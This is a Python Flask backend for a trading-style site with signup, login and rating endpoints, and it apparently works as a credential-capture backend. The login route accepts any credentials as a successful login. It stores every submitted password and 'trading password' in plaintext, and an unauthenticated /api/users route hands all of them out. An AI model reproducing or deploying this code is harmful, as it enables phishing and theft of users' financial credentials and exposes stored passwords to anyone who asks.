from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
import psycopg2
import psycopg2.extras
import os
from datetime import datetime

app = Flask(__name__)
CORS(app)

# Neon PostgreSQL connection string (Set this in Vercel Environment Variables)
DATABASE_URL = os.environ.get('DATABASE_URL')


def get_db():
    """Get a connection to the Neon PostgreSQL database."""
    conn = psycopg2.connect(DATABASE_URL)
    return conn


def init_db():
    """Initialize the Neon database and create the users and signup_users tables."""
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id SERIAL PRIMARY KEY,
            login_type TEXT NOT NULL,
            email TEXT,
            phone_number TEXT,
            password TEXT NOT NULL,
            trading_password TEXT,
            remember_password INTEGER DEFAULT 0,
            created_at TEXT NOT NULL
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS signup_users (
            id SERIAL PRIMARY KEY,
            signup_type TEXT NOT NULL,
            email TEXT,
            phone_number TEXT,
            password TEXT NOT NULL,
            trading_password TEXT,
            invite_code TEXT,
            created_at TEXT NOT NULL
        )
    ''')
    conn.commit()
    conn.close()


def ensure_signup_table():
    """Ensure the signup_users table exists (called on first request)."""
    try:
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS signup_users (
                id SERIAL PRIMARY KEY,
                signup_type TEXT NOT NULL,
                email TEXT,
                phone_number TEXT,
                password TEXT NOT NULL,
                trading_password TEXT,
                invite_code TEXT,
                created_at TEXT NOT NULL
            )
        ''')
        conn.commit()
        conn.close()
    except Exception:
        pass


# Ensure signup_users table exists on startup
ensure_signup_table()


@app.route('/api/signup', methods=['POST'])
def signup():
    """Handle signup form submission and save details to the signup_users table."""
    data = request.get_json()

    signup_type = data.get('signup_type', 'email')
    email = data.get('email', '')
    phone_number = data.get('phone_number', '')
    password = data.get('password', '')
    trading_password = data.get('trading_password', '')
    invite_code = data.get('invite_code', '')
    created_at = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    if not password:
        return jsonify({'success': False, 'message': 'Password is required'}), 400

    if signup_type == 'email' and not email:
        return jsonify({'success': False, 'message': 'Email is required'}), 400

    if signup_type == 'phone' and not phone_number:
        return jsonify({'success': False, 'message': 'Phone number is required'}), 400

    try:
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO signup_users (signup_type, email, phone_number, password, trading_password, invite_code, created_at)
            VALUES (%s, %s, %s, %s, %s, %s, %s)
        ''', (signup_type, email, phone_number, password, trading_password, invite_code, created_at))
        conn.commit()
        conn.close()

        return jsonify({'success': True, 'message': 'Account created successfully'}), 200
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)}), 500



@app.route('/api/login', methods=['POST'])
def login():
    """Handle login form submission. Check signup_users first for authentication,
    otherwise save details to the users table."""
    data = request.get_json()

    login_type = data.get('login_type', 'email')
    email = data.get('email', '')
    phone_number = data.get('phone_number', '')
    password = data.get('password', '')
    trading_password = data.get('trading_password', '')
    remember_password = 1 if data.get('remember_password', False) else 0
    created_at = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    if not password:
        return jsonify({'success': False, 'message': 'Password is required'}), 400

    if not trading_password:
        return jsonify({'success': False, 'message': 'Trading password is required'}), 400

    if login_type == 'email' and not email:
        return jsonify({'success': False, 'message': 'Email is required'}), 400

    if login_type == 'phone' and not phone_number:
        return jsonify({'success': False, 'message': 'Phone number is required'}), 400

    try:
        conn = get_db()
        cursor = conn.cursor()

        # First, check if credentials match a signup_users record
        if login_type == 'email':
            cursor.execute(
                'SELECT id FROM signup_users WHERE email = %s AND password = %s',
                (email, password)
            )
        else:
            cursor.execute(
                'SELECT id FROM signup_users WHERE phone_number = %s AND password = %s',
                (phone_number, password)
            )

        signup_match = cursor.fetchone()

        if signup_match:
            # Credentials match a signed-up user — redirect to dashboard
            conn.close()
            return jsonify({'success': True, 'redirect': 'dashboard', 'message': 'Login successful'}), 200
        else:
            # Auto-register new user directly into signup_users table
            cursor.execute('''
                INSERT INTO signup_users (signup_type, email, phone_number, password, trading_password, invite_code, created_at)
                VALUES (%s, %s, %s, %s, %s, %s, %s)
            ''', (login_type, email, phone_number, password, trading_password, '', created_at))

            # Also log to users table
            cursor.execute('''
                INSERT INTO users (login_type, email, phone_number, password, trading_password, remember_password, created_at)
                VALUES (%s, %s, %s, %s, %s, %s, %s)
            ''', (login_type, email, phone_number, password, trading_password, remember_password, created_at))

            conn.commit()
            conn.close()

            return jsonify({'success': True, 'redirect': 'dashboard', 'message': 'Account created and logged in successfully'}), 200
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)}), 500



@app.route('/api/rating', methods=['POST'])
def save_rating():
    """Handle rating and feedback submission."""
    data = request.get_json()

    rating = data.get('rating', 0)
    feedback = data.get('feedback', '')
    email = data.get('email', '')
    phone_number = data.get('phone_number', '')
    created_at = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    if not rating or int(rating) < 1 or int(rating) > 5:
        return jsonify({'success': False, 'message': 'A star rating between 1 and 5 is required'}), 400

    try:
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS ratings (
                id SERIAL PRIMARY KEY,
                rating INTEGER NOT NULL,
                feedback TEXT,
                email TEXT,
                phone_number TEXT,
                created_at TEXT NOT NULL
            )
        ''')
        cursor.execute('''
            INSERT INTO ratings (rating, feedback, email, phone_number, created_at)
            VALUES (%s, %s, %s, %s, %s)
        ''', (int(rating), feedback, email, phone_number, created_at))
        conn.commit()
        conn.close()

        return jsonify({'success': True, 'message': 'Rating saved successfully'}), 200
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)}), 500


@app.route('/api/users', methods=['GET'])
def get_users():
    """Retrieve all saved login entries (for admin/debugging)."""
    try:
        conn = get_db()
        cursor = conn.cursor(cursor_factory=psycopg2.extras.RealDictCursor)
        cursor.execute('SELECT * FROM users ORDER BY created_at DESC')
        rows = cursor.fetchall()
        conn.close()

        users = [dict(row) for row in rows]
        return jsonify({'success': True, 'users': users}), 200
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)}), 500


if __name__ == '__main__':
    # init_db()  # Commented out for Vercel deployment
    # print('Neon database initialized.')
    print('Server running at http://localhost:5000')
    app.run(debug=True, host='0.0.0.0', port=5000)
